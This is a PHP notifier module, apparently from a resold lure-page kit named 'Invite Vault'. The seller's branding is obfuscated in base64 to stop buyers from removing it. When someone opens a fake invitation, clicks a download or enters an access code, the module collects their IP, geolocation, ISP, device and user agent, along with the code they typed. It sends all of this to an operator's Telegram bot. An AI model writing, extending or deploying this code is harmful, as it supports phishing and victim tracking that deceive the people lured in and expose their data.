<?php
/**
 * Telegram notifier — no external deps beyond curl + one free geo lookup.
 * Brand signature is base64-encoded so end-buyers can't casually swap it out.
 */

function iv_brand(): array {
    // base64("@redirectmiddle") / base64("https://t.me/redirectmiddle")
    // Change ONLY if you know what you're doing — obfuscated on purpose.
    $sig  = base64_decode('QHJlZGlyZWN0bWlkZGxl');
    $link = base64_decode('aHR0cHM6Ly90Lm1lL3JlZGlyZWN0bWlkZGxl');
    return [$sig, $link];
}

function iv_client_ip(): string {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $ip = trim(explode(',', $_SERVER[$k])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '0.0.0.0';
}

function iv_parse_ua(string $ua): array {
    $device = 'Desktop';
    if     (preg_match('/iPhone|iPod/i', $ua))  $device = 'iPhone';
    elseif (preg_match('/iPad/i', $ua))         $device = 'iPad';
    elseif (preg_match('/Android/i', $ua))      $device = stripos($ua, 'Mobile') !== false ? 'Android Phone' : 'Android Tablet';
    elseif (preg_match('/Macintosh/i', $ua))    $device = 'Mac';
    elseif (preg_match('/Linux/i', $ua))        $device = 'Linux';
    elseif (preg_match('/Windows/i', $ua))      $device = 'Windows PC';

    $browser = 'Unknown';
    if     (preg_match('/Edg\//i', $ua))        $browser = 'Edge';
    elseif (preg_match('/OPR\/|Opera/i', $ua))  $browser = 'Opera';
    elseif (preg_match('/Chrome\//i', $ua))     $browser = 'Chrome';
    elseif (preg_match('/Firefox\//i', $ua))    $browser = 'Firefox';
    elseif (preg_match('/Safari\//i', $ua))     $browser = 'Safari';
    return [$device, $browser];
}

function iv_geo(string $ip): array {
    $out = ['country' => '', 'region' => '', 'city' => '', 'isp' => ''];
    if ($ip === '0.0.0.0') return $out;
    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,isp");
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 4]);
    $body = curl_exec($ch); curl_close($ch);
    if (!$body) return $out;
    $j = json_decode($body, true);
    if (!is_array($j) || ($j['status'] ?? '') !== 'success') return $out;
    return [
        'country' => $j['country']    ?? '',
        'region'  => $j['regionName'] ?? '',
        'city'    => $j['city']       ?? '',
        'isp'     => $j['isp']        ?? '',
    ];
}

function iv_notify(array $cfg, array $ctx): void {
    if (empty($cfg['telegram_bot_token']) || empty($cfg['telegram_chat_id'])) return;

    $ip   = iv_client_ip();
    $ua   = $ctx['ua']    ?? ($_SERVER['HTTP_USER_AGENT'] ?? '');
    $geo  = iv_geo($ip);
    [$device, $browser] = iv_parse_ua($ua);
    $time = gmdate('H:i:s d/m/Y');
    $loc  = trim(implode(', ', array_filter([$geo['city'], $geo['region'], $geo['country']])));
    if ($loc === '') $loc = 'Unknown';

    $sender  = $ctx['sender']  ?? '';
    $invitee = $ctx['invitee'] ?? '';
    $page    = $cfg['page_name'] ?? 'Invite Vault';
    $mode    = ucfirst($cfg['page_mode'] ?? 'invitation');
    $event   = $ctx['event']   ?? 'open';
    [$brand, $brandLink] = iv_brand();

    $header = $event === 'download'
        ? "⬇️ <b>Download Clicked</b>"
        : ($event === 'code'
            ? "🔑 <b>Access Code Entered</b>"
            : "🎟 <b>New " . htmlspecialchars($mode) . " Opened</b>");

    $text  = "{$header}\n";
    $text .= "📄 Page: <b>" . htmlspecialchars($page) . "</b>\n";
    if ($sender  !== '') $text .= "✍️ Sender: <b>"  . htmlspecialchars($sender)  . "</b>\n";
    if ($invitee !== '') $text .= "👤 Invitee: <b>" . htmlspecialchars($invitee) . "</b>\n";
    if (!empty($ctx['code'])) $text .= "🔐 Code: <code>" . htmlspecialchars($ctx['code']) . "</code>\n";
    $text .= "\n";
    $text .= "🌐 IP: <code>{$ip}</code>\n";
    $text .= "🔗 Lookup: http://www.geoiptool.com/?IP={$ip}\n";
    $text .= "📍 Location: " . htmlspecialchars($loc) . "\n";
    if ($geo['isp'] !== '') $text .= "🏢 ISP: " . htmlspecialchars($geo['isp']) . "\n";
    $text .= "\n";
    $text .= "⏰ Time: {$time} UTC\n";
    $text .= "💻 Device: " . htmlspecialchars("{$device} / {$browser}") . "\n";
    $text .= "🧭 UA: <code>" . htmlspecialchars(mb_substr($ua, 0, 200)) . "</code>\n";
    $text .= "\n";
    $text .= "👨‍💻 Source: <a href=\"" . htmlspecialchars($brandLink) . "\">" . htmlspecialchars($brand) . "</a>";

    $url = "https://api.telegram.org/bot{$cfg['telegram_bot_token']}/sendMessage";
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query([
            'chat_id'                  => $cfg['telegram_chat_id'],
            'text'                     => $text,
            'parse_mode'               => 'HTML',
            'disable_web_page_preview' => 'true',
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 6,
    ]);
    curl_exec($ch);
    curl_close($ch);
}
